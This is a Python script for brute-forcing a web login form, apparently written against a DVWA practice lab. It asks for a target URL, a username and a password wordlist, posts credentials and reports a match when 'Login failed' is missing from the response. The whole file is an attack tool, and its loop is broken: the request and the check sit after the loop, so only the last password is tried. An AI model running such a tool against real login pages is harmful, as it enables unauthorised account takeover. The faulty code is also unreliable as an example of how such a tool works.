from termcolor import cprint
import pyfiglet
import requests
from datetime import datetime


# Basic user interface header
banner = pyfiglet.figlet_format("RACCOON -> LCRACKER")
cprint(banner, 'blue')

# Asking the user for a URL anda username to use in the attack
url = input("What URL do you want to bruteforce? (ex.http://192.168.142.138/dvwa/login.php): ")
username = input("What username do you want to try? (ex admin): ")

# This is where we ask the user for a password file. The program will read it
# if the password is found, it will be printed in green
# if the password is not found, it will be printed as 'attempt failed' in red
try:
    password_file = input("Please enter the name of the password file: ")
    file = open(password_file, "r")
except FileNotFoundError:
    cprint("The file was not found...", 'red')

#The banner with information about when the cracking starts + the hash to be cracked
cprint("_" * 50, 'blue')
cprint("The URL is " + url, 'blue')
cprint("Cracking with username " + username, 'blue')
cprint("Cracking with this passwordfile: " + password_file, 'blue')
cprint("Cracking login page started at: " + str(datetime.now()), 'blue')
cprint("_" * 50, 'blue')



# Now the program will try all passwords in the password file

try:
    for password in file.readlines():
        password = password.strip("\n")

    data = {'username':username, 'password':password, "Login":'submit'}
    send_data_url = requests.post(url, data=data, verify=False)
    cprint("HTTP status code: ", 'green')
    print(send_data_url.status_code)
    cprint("The HTML: ", 'green')
    print(send_data_url.content)
    cprint("The URL: ", 'green')
    print(send_data_url.url)


    if "Login failed" in str(send_data_url.content):
        cprint("[*] Attempting password: %s" % password, 'red')
    else:
        cprint("[*] Password found: %s " % password,'green')
        

        
        

except:
    cprint("There was an error, please try again..", 'red')